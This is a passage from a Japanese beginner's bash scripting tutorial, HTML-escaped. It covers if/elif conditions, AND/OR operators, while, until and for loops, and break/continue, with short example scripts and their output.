&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="if-else-ifステートメント">if-else ifステートメント&lt;/h3>
&lt;p>スクリプトでif-else ifをステートメントのブロックとして使用すると、プログラムは条件を再チェックします。同様に、以下のサンプルコードを「helloScript.sh」に記述すると、プログラムは最初に「if」条件をチェックすることがわかります。「カウント」変数には「10」の値が割り当てられます。最初の「if」条件では、プログラムは「カウント」が9より大きい値を持っていることを確認します。その後、「if」ブロックに書かれたステートメントが実行され、そこから出てきます。たとえば、「elif」で書かれた条件がtrueの場合、プログラムは「elif」ブロックで書かれたステートメントのみを実行し、ステートメントの「if」および「else」ブロックを無視します。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:ifelseif-statements.sh" data-lang="bash:ifelseif-statements.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="nv">count&lt;/span>&lt;span class="o">=&lt;/span>8&lt;span class="p">;&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="o">((&lt;/span>count&amp;gt;9&lt;span class="o">))&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="k">then&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;the first condition is true&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">elif&lt;/span> &lt;span class="o">((&lt;/span>count&amp;lt;&lt;span class="o">=&lt;/span>9&lt;span class="o">))&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="k">then&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;then second condition is true&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">else&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;the condition is false&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">fi&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="and演算子">AND演算子&lt;/h3>
&lt;p>条件で「AND」演算子を使用するには、条件間で記号「&amp;amp;&amp;amp;」を使用します。&lt;br>
たとえば、「[ &amp;ldquo;$age&amp;rdquo; -gt 18 ] と [ &amp;ldquo;$age&amp;rdquo; -lt 40 ]をチェックし、年齢が18より大きく、年齢が40未満の場合、これはfalseであることがわかります。プログラムは「その後」の後に書かれたステートメントを無視し、端末に「年齢は正しくない」と印刷して「else」ブロックに向かって移動します&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:andOperator.sh" data-lang="bash:andOperator.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="nv">age&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="m">10&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="o">[&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$age&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> -gt &lt;span class="m">18&lt;/span> &lt;span class="o">]&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="o">[&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$age&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> -lt &lt;span class="m">40&lt;/span> &lt;span class="o">]&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="k">then&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;age is correct&amp;#34;&lt;/span>
&lt;span class="k">else&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;age is not correct&amp;#34;&lt;/span>
&lt;span class="k">fi&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>条件を次の形式で書くこともできます。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:andOperator2.sh" data-lang="bash:andOperator2.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="nv">age&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="m">30&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="o">[[&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$age&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> -gt &lt;span class="m">18&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$age&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> -lt &lt;span class="m">40&lt;/span> &lt;span class="o">]]&lt;/span>
&lt;span class="k">then&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;age is correct&amp;#34;&lt;/span>
&lt;span class="k">else&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;age is not correct&amp;#34;&lt;/span>
&lt;span class="k">fi&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>「&amp;amp;&amp;amp;」の代わりに「-a」を使用して、プログラムの条件でAND演算子を使用することもできます。それは同じように動作します。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:andOperator3.sh" data-lang="bash:andOperator3.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="nv">age&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="m">30&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="o">[&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$age&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> -gt &lt;span class="m">18&lt;/span> -a &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$age&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> -lt &lt;span class="m">40&lt;/span> &lt;span class="o">]&lt;/span>
&lt;span class="k">then&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;age is correct&amp;#34;&lt;/span>
&lt;span class="k">else&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;age is not correct&amp;#34;&lt;/span>
&lt;span class="k">fi&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>このコードを「helloScript.sh」スクリプトに保存し、ターミナルから実行します&lt;/p>
&lt;h3 id="or演算子">OR演算子&lt;/h3>
&lt;p>2つの条件があり、それらのいずれかまたは両方がtrueの場合、前述のステートメントを実行する場合、OR演算子が使用されます。 「-o」はOR演算子を表すために使用されます。「||」記号を使用することもできます。&lt;br>
次のサンプルコードを「helloScript.sh」に書き、ターミナルから実行して動作を確認します。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:orOperator.sh" data-lang="bash:orOperator.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="nv">age&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="m">30&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="o">[&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$age&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> -gt &lt;span class="m">18&lt;/span> -o &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$age&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> -lt &lt;span class="m">40&lt;/span> &lt;span class="o">]&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="k">then&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;age is correct&amp;#34;&lt;/span>
&lt;span class="k">else&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;age is not correct&amp;#34;&lt;/span>
&lt;span class="k">fi&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>OR演算子をよりよく理解するために、さまざまな条件を試すこともできます。以下に４つのサンプルを記します。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:orOperator1.sh" data-lang="bash:orOperator1.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="nv">age&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="m">30&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="o">[&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$age&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> -lt &lt;span class="m">18&lt;/span> -o &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$age&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> -lt &lt;span class="m">40&lt;/span> &lt;span class="o">]&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="k">then&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;age is correct&amp;#34;&lt;/span>
&lt;span class="k">else&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;age is not correct&amp;#34;&lt;/span>
&lt;span class="k">fi&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:orOperator2.sh" data-lang="bash:orOperator2.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="nv">age&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="m">30&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="o">[&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$age&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> -lt &lt;span class="m">18&lt;/span> -o &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$age&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> -gt &lt;span class="m">40&lt;/span> &lt;span class="o">]&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="k">then&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;age is correct&amp;#34;&lt;/span>
&lt;span class="k">else&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;age is not correct&amp;#34;&lt;/span>
&lt;span class="k">fi&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:orOperator3.sh" data-lang="bash:orOperator3.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="nv">age&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="m">30&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="o">[[&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$age&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> -lt &lt;span class="m">18&lt;/span> &lt;span class="o">||&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$age&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> -gt &lt;span class="m">40&lt;/span> &lt;span class="o">]]&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="k">then&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;age is correct&amp;#34;&lt;/span>
&lt;span class="k">else&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;age is not correct&amp;#34;&lt;/span>
&lt;span class="k">fi&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:orOperator4.sh" data-lang="bash:orOperator4.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="nv">age&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="m">30&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="o">[&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$age&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> -lt &lt;span class="m">18&lt;/span> &lt;span class="o">]&lt;/span> &lt;span class="o">||&lt;/span> &lt;span class="o">[&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$age&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> -gt &lt;span class="m">40&lt;/span> &lt;span class="o">]&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="k">then&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;age is correct&amp;#34;&lt;/span>
&lt;span class="k">else&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;age is not correct&amp;#34;&lt;/span>
&lt;span class="k">fi&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="ループ">ループ&lt;/h2>
&lt;p>このトピックでは、以下の説明をします。&lt;/p>
&lt;p>whileループ&lt;br>
until ループ&lt;br>
for ループ&lt;br>
break と continue&lt;/p>
&lt;h3 id="whileループ">whileループ:&lt;/h3>
&lt;p>ループは条件がtrueの場合にコードブロック(do&amp;hellip;doneで囲まれています)を実行し、条件がfalseになるまでそれを実行し続けます。&lt;/p>
&lt;p>条件がfalseになると、whileループは終了します。&lt;br>
whileループは、キーワード「while」から始まり、そのうしろに条件文を書きます。&lt;br>
条件文を閉じたらキーワード「do」を使用し、プログラムの条件がtrueの場合に実行する処理ステートメントの束を書きます。&lt;br>
処理ステートメントの終了後、キーワード「done」を書いてwhileループを閉じます。&lt;/p>
&lt;p>以下、スクリプトを「helloScript.sh」として保存します。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:whileLoop.sh" data-lang="bash:whileLoop.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="nv">number&lt;/span>&lt;span class="o">=&lt;/span>1&lt;span class="p">;&lt;/span>
&lt;span class="k">while&lt;/span> &lt;span class="o">[&lt;/span> &lt;span class="nv">$number&lt;/span> -lt &lt;span class="m">10&lt;/span> &lt;span class="o">]&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="k">do&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$number&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nv">number&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="k">$((&lt;/span> number+1 &lt;span class="k">))&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">done&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ターミナルで「$ ./whileLoop.sh」コマンドを使用してスクリプトを実行ます。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ bash whileLoop.sh
1
2
3
4
5
6
7
8
9
$
&lt;/code>&lt;/pre>&lt;p>Whileループでは、まず、条件が真かどうかをチェックします。&lt;br>
条件がfalseの場合、ループから出てプログラムを終了します。&lt;/p>
&lt;p>条件が true の場合、実行シーケンスはキーワード &amp;lsquo;do&amp;rsquo; の後に書かれたステートメントに移動します。&lt;br>
上記サンプルのは、「echo」により１から９までが出力されます。&lt;/p>
&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ヒント&lt;/dt>
&lt;dd>ループ自体をループさせるincrementステートメントについて&lt;/dd>
&lt;dd>$(( )) は、括弧内で計算された値が引き出されます。&lt;/dd>
&lt;dd>(( )) 内は、変数の冒頭に $ は必要ありません。&lt;/dd>
&lt;dd>(( )) 内は、四則演算が可能です。スペースを空ける必要もありません。&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;h3 id="until-ループ">until ループ:&lt;/h3>
&lt;p>loopが条件がfalseのときにコードブロック(do&amp;hellip;doneで囲まれている)を実行し、条件がtrueになるまで実行し続けるまでループし続け、条件が true になると、until ループは終了します。&lt;br>
untilループの構文はwhileループの構文と同じで、「while」の代わりに「until」という言葉を使用します。&lt;/p>
&lt;p>ターミナルで「$ ./untilLoop.sh」コマンドを使用してスクリプトを実行ます。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:untilLoop.sh" data-lang="bash:untilLoop.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="nv">number&lt;/span>&lt;span class="o">=&lt;/span>1&lt;span class="p">;&lt;/span>
&lt;span class="k">until&lt;/span> &lt;span class="o">[&lt;/span> &lt;span class="nv">$number&lt;/span> -ge &lt;span class="m">10&lt;/span> &lt;span class="o">]&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="k">do&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$number&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nv">number&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="k">$((&lt;/span> number+1 &lt;span class="k">))&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">done&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>上記のコードを「untilLoop.sh」ファイルに保存します。コマンドを使って実行する&lt;/p>
&lt;pre tabindex="0">&lt;code>$ bash untilLoop.sh
1
2
3
4
5
6
7
8
9
$
&lt;/code>&lt;/pre>&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ヒント&lt;/dt>
&lt;dd>whileループは、条件が true の時に( do &amp;hellip;done) ブロックを実行し、条件が false になるとループを終了します。&lt;/dd>
&lt;dd>untilループは、条件が false の時に( do &amp;hellip;done) ブロックを実行し、条件が true になるとループを終了します。&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;h3 id="for-ループ">for ループ:&lt;/h3>
&lt;p>forループは、繰り返し実行される条件を指定するループのタイプです。&lt;br>
forループには、いくつかの記述方法があります。&lt;br>
最初の方法として、反復用の数字を書きます。&lt;br>
以下に示すコードでは、反復用の数字反復を制御する変数 &amp;lsquo;i&amp;rsquo; にさせます。&lt;br>
以下のfor ループは 5 回実行されます。&lt;br>
スクリプトファイル「helloScript.sh」にコードを保存します。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:forLoop.sh" data-lang="bash:forLoop.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="k">for&lt;/span> i in &lt;span class="m">1&lt;/span> &lt;span class="m">2&lt;/span> &lt;span class="m">3&lt;/span> &lt;span class="m">4&lt;/span> &lt;span class="m">5&lt;/span> &lt;span class="p">;&lt;/span> &lt;span class="k">do&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="nv">$i&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">done&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ターミナルで次のコマンドを入力して、「forLoop.sh」ファイルを実行します。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ bash forLoop.sh
1
2
3
4
5
$
&lt;/code>&lt;/pre>&lt;p>この方法はシンプルに見えますが、1000回実行したい場合は、実行したい数値を列挙する必要があるため大変です。&lt;br>
実は、1から1000までの反復回数を書く必要はなく、ループに他の書き方を使用します。&lt;br>
以下のサンプルコード「for i in {0..10}」のように、反復の開始点と終了点を宣言します。&lt;br>
この書き方によってforループは10回実行されます。 &amp;lsquo;0&amp;rsquo; は開始点として定義され、&amp;lsquo;10&amp;rsquo; は反復の終了点として定義されます。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:forLoop2.sh" data-lang="bash:forLoop2.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="k">for&lt;/span> i in &lt;span class="o">{&lt;/span>0..10&lt;span class="o">}&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="k">do&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="nv">$i&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">done&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ファイル「forLoop2.sh」にコードを保存します。ファイルを実行すると、次の出力が表示されます。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ bash forLoop2.sh
0
1
2
3
4
5
6
7
8
9
10
$
&lt;/code>&lt;/pre>&lt;p>ループを制御する変数の増分値を定義することもできます。&lt;br>
たとえば、「for i in {0..10..2}」では、&amp;lsquo;0&amp;rsquo; をループの開始点、&amp;lsquo;10&amp;rsquo; は終点、&amp;lsquo;2&amp;rsquo; はループは &amp;lsquo;i&amp;rsquo; 2の増分で、echo $i ステートメントを実行します。&lt;br>
したがって、以下に示す例では、プログラムはループの最初の実行で0を出力し、その後、「i」の値を２つずつインクリメントします。&lt;br>
このコードは、「i」の値を0,2,4,6,8,10として出力します。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="k">for&lt;/span> i in &lt;span class="o">{&lt;/span>0..10..2&lt;span class="o">}&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="k">do&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="nv">$i&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">done&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>$ bash forLoop3.sh
0
2
4
6
8
10
$
&lt;/code>&lt;/pre>&lt;p>多くのプログラミング言語でおなじみ「for loop」書式の記述も可能です。&lt;br>
以下のサンプルコードは、このメソッドを使用して「forループ」を書いています。&lt;br>
&amp;lsquo;for (( i=0; i&amp;lt;5; i++ ))’ では、&amp;lsquo;i’ はループ全体を制御する変数です。&lt;br>
まず、値 &amp;lsquo;i&amp;rsquo; は 値 &amp;lsquo;0&amp;rsquo; で初期化され、次にループ &amp;lsquo;i&amp;lt;5&amp;rsquo; の制御ステートメント、&amp;lsquo;i++&amp;rsquo; はループのたびに１つずつインクリメントする事をあわらします。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:increments.sh" data-lang="bash:increments.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="o">((&lt;/span> &lt;span class="nv">i&lt;/span>&lt;span class="o">=&lt;/span>0&lt;span class="p">;&lt;/span> i&amp;lt;5&lt;span class="p">;&lt;/span> i++ &lt;span class="o">))&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="k">do&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="nv">$i&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">done&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&amp;lsquo;i&amp;rsquo;は0で初期化され、&amp;lsquo;i&amp;rsquo;の値が5未満の条件をチェックします。&lt;br>
最初条件の結果は &amp;lsquo;true&amp;rsquo; です。&lt;br>
処理ステートメントに進み、、echo コマンドにより端末に「i」の値を「0」として出力します。&lt;br>
処理が進むにつれ、値「i」が一つずつ増加します。&lt;br>
プログラムは処理の中で、「i」の値が5未満であるかどうかを再度確認し、再び「i」の値(&amp;lsquo;1」を出力します。&lt;br>
この実行フローは、「i」の値が「5」の値に達するまで続き、「５」に達した段階ではforループをぬけてプログラムは終了します。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ bash increments.sh
0
1
2
3
4
$
&lt;/code>&lt;/pre>&lt;h3 id="breakとcontinue">breakとcontinue&lt;/h3>
&lt;p>breakステートメントは、指定された条件でループを終了するために使用されます。&lt;br>
以下に示すコードでは、for loopは if ステートメントの条件により、「i」の値が &amp;lsquo;5&amp;rsquo; になるまで通常の実行を行い、「i」が &amp;lsquo;5以上&amp;rsquo; ループを停止します。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:break.sh" data-lang="bash:break.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="o">((&lt;/span> &lt;span class="nv">i&lt;/span>&lt;span class="o">=&lt;/span>0&lt;span class="p">;&lt;/span> i&amp;lt;&lt;span class="o">=&lt;/span>10&lt;span class="p">;&lt;/span> i++ &lt;span class="o">))&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="k">do&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="o">[&lt;/span> &lt;span class="nv">$i&lt;/span> -gt &lt;span class="m">5&lt;/span> &lt;span class="o">]&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="k">then&lt;/span>
break&lt;span class="p">;&lt;/span>
&lt;span class="k">fi&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="nv">$i&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">done&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>スクリプトを保存し、ファイルを実行します。次の出力が得られます。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ bash break.sh
0
1
2
3
4
5
$
&lt;/code>&lt;/pre>&lt;p>Continueステートメントは、breakステートメントとは対照的に機能します。&lt;br>
条件が真である場合は反復をスキップ( continue )し、次の反復に向かって処理を進めます。&lt;br>
以下のループは、&amp;lsquo;3&amp;rsquo; と &amp;lsquo;7&amp;rsquo; を除いて、&amp;lsquo;0&amp;rsquo; から &amp;lsquo;20&amp;rsquo; までの端末に &amp;lsquo;i&amp;rsquo; 変数の値を出力します。&lt;br>
ifステートメント &amp;lsquo;if [ $i -eq 3 ] || [ $i -eq 7 ]&amp;rsquo; は、&amp;lsquo;i&amp;rsquo; の値が 3 または 7 に等しいときは反復をスキップし、echoせずにforループの処理を進めます。&lt;/p>
&lt;p>この概念をよりよく理解するために、次のコードを実行します。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:continue.sh" data-lang="bash:continue.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="o">((&lt;/span> &lt;span class="nv">i&lt;/span>&lt;span class="o">=&lt;/span>0&lt;span class="p">;&lt;/span> i&amp;lt;&lt;span class="o">=&lt;/span>10&lt;span class="p">;&lt;/span> i++ &lt;span class="o">))&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="k">do&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="o">[&lt;/span> &lt;span class="nv">$i&lt;/span> -eq &lt;span class="m">3&lt;/span> &lt;span class="o">]&lt;/span> &lt;span class="o">||&lt;/span> &lt;span class="o">[&lt;/span> &lt;span class="nv">$i&lt;/span> -eq &lt;span class="m">7&lt;/span> &lt;span class="o">]&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="k">then&lt;/span>
&lt;span class="k">continue&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">fi&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="nv">$i&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">done&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>$ bash continue.sh
0
1
2
4
5
6
8
9
10
$
&lt;/code>&lt;/pre>&lt;p>以下のように書くこともできます。こちらの記述のほうがすっきりしていて、Ｃ言語やＪａｖａに慣れ親しんでいる人は、直感的に理解できるかもしれません。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="k">for&lt;/span> &lt;span class="o">((&lt;/span> &lt;span class="nv">i&lt;/span>&lt;span class="o">=&lt;/span>0&lt;span class="p">;&lt;/span> i&amp;lt;&lt;span class="o">=&lt;/span>10&lt;span class="p">;&lt;/span> i++ &lt;span class="o">))&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="k">do&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="o">((&lt;/span> &lt;span class="nv">i&lt;/span>&lt;span class="o">==&lt;/span>&lt;span class="m">3&lt;/span> &lt;span class="o">||&lt;/span> &lt;span class="nv">i&lt;/span>&lt;span class="o">==&lt;/span>&lt;span class="m">7&lt;/span> &lt;span class="o">))&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="k">then&lt;/span>
&lt;span class="k">continue&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">fi&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="nv">$i&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">done&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ヒント&lt;/dt>
&lt;dd>(( )) で囲む記述で書いていく方が良いかもしれません。&lt;/dd>
&lt;dd>他の言語で慣れ親しんでいる書き方を踏襲することで、bash独特の書き方に振り回される事がないからです。&lt;/dd>
&lt;dd>なにより、(( )) 内は、変数の冒頭に &amp;lsquo;$&amp;rsquo; が不要になるだけでも、コードが見やすくなります。&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;h2 id="スクリプトへの値渡し実行パラメータ">スクリプトへの値渡し「実行パラメータ」&lt;/h2>
&lt;p>このトピックの最初の例は、スクリプトを実行する際に、スクリプトへの入力として値を与えるための説明をします。&lt;/p>
